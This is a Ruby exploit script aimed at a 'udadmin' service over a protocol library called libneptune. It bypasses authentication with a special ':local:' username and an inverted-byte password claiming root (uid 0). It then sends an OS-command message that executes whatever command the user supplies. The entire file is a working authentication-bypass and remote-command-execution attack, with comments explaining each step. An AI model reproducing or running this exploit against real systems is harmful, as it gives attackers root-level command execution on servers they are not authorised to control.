# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> <port> <command>"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438 'touch /tmp/hello'"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || usage()
COMMAND = ARGV[2] || usage()

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

# Connect to the udadmin service
puts "Connecting to 'udadmin' service:"
pp connection.send_recv(
  args: [
    # Service name
    { type: :string, value: 'udadmin' },

    # "SSL Flag" - must be non-zero if the service is started in "secure-only" mode (-s)
    # (doesn't affect this exploit)
    { type: :integer, value: 1337 },
  ],
)

pp connection.send_recv(
  args: [
    # Message type
    { type: :integer, value: LibNeptune::MESSAGE_LOGIN },

    # Username
    # ":local:" is a special value that skips login
    { type: :string, value: ':local:' },

    # Password (encoded by making each byte negative)
    # I think if username is :local:, this is username:uid:gid (gid can't be 0)
    { type: :string, value: 'root:0:123'.bytes.map { |b| (0x0FF & (~b)).chr }.join },
  ],
)

pp connection.send_recv(
  args: [
    # Message type
    { type: :integer, value: LibNeptune::MESSAGE_OSCOMMAND },
    { type: :string, value: COMMAND },
  ],
)

connection.close()
